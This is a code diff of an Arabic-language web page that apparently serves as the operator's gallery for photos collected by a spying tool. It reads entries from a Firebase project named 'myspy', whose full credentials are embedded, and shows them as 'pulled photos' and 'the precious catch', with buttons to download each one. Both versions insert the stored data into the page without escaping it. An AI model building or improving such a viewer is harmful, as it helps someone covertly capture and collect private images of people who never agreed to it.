@@ -2,58 +2,44 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>استوديو آلَﻤــشّـآ كَسًـ آلَۼد 📸</title>
+    <title>استوديو آلَﻤــشّـآ كَسًـ آلَۼد</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; text-align: center; direction: rtl; }
-        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 20px; }
-        .photo-card { border: 2px solid #ff0000; padding: 15px; border-radius: 20px; background: #111; box-shadow: 0 0 20px rgba(255,0,0,0.3); width: 300px; }
-        img { width: 100%; border-radius: 15px; border: 1px solid #333; cursor: pointer; transition: 0.3s; }
-        img:hover { transform: scale(1.02); border-color: #ff0000; }
-        .download-btn { background: #ff0000; color: white; border: none; padding: 12px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; font-size: 16px; }
-        p { font-size: 14px; color: #888; margin: 10px 0; }
+        body { background: #000; color: #fff; text-align: center; direction: rtl; font-family: sans-serif; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; padding: 20px; }
+        .card { border: 2px solid #f00; border-radius: 15px; background: #111; padding: 15px; transition: 0.3s; }
+        img { width: 100%; border-radius: 10px; cursor: pointer; }
+        .dl-btn { background: #f00; color: #fff; border: none; padding: 12px; border-radius: 10px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1 style="color: #ff0000; text-shadow: 0 0 15px red; font-size: 30px;">📸 معرض الصور المسحوبة</h1>
-    <p style="font-size: 18px;">بإشراف: <span style="color:red; font-weight:bold;">آلَﻤــشّـآ كَسًـ آلَۼد</span></p>
-    <div class="gallery" id="gallery"></div>
-
+    <h1 style="color: #f00; text-shadow: 0 0 10px #f00;">📸 معرض الصيد الثمين</h1>
+    <p>إشراف: آلَﻤــشّـآ كَسًـ آلَۼد</p>
+    <div class="gallery" id="list"></div>
     <script>
-        const firebaseConfig = {
-          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
-          authDomain: "myspy-2579b.firebaseapp.com",
-          projectId: "myspy-2579b",
-          storageBucket: "myspy-2579b.firebasestorage.app",
-          messagingSenderId: "487846863334",
-          appId: "1:487846863334:web:b58620e6f34d187e02b627"
-        };
+        const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        db.ref('results').on('child_added', (snap) => {
-            const data = snap.val();
-            const div = document.createElement('div');
-            div.className = 'photo-card';
-            const fileName = `صيدة_${data.date.replace(/[/, :]/g, '_')}.jpg`;
-
-            div.innerHTML = `
-                <img src="${data.photo}" onclick="window.open(this.src, '_blank');" title="اضغط لفتح الصورة فوراً">
-                <p>${data.date}</p>
-                <button onclick="downloadImg('${data.photo}', '${fileName}')" class="download-btn">حفظ في الاستوديو 📥</button>
+        db.ref('results').on('child_added', (s) => {
+            const d = s.val();
+            const c = document.createElement('div');
+            c.className = 'card';
+            c.innerHTML = `
+                <img src="${d.photo}" onclick="window.open(this.src)">
+                <p>${d.date}</p>
+                <button class="dl-btn" onclick="downloadIt('${d.photo}')">حفظ في المعرض 📥</button>
             `;
-            document.getElementById('gallery').prepend(div);
+            document.getElementById('list').prepend(c);
         });
 
-        function downloadImg(uri, name) {
-            var link = document.createElement("a");
-            link.download = name;
-            link.href = uri;
-            document.body.appendChild(link);
+        function downloadIt(base64) {
+            const link = document.createElement('a');
+            link.href = base64;
+            link.download = `صيدة_${Date.now()}.jpg`;
             link.click();
-            document.body.removeChild(link);
-            alert("تم الحفظ بنجاح! هتلاقيها في المعرض دلوقتي يا بطل 🔥");
+            alert("تم الحفظ بنجاح! افتح المعرض دلوقتي 🔥");
         }
     </script>
 </body>
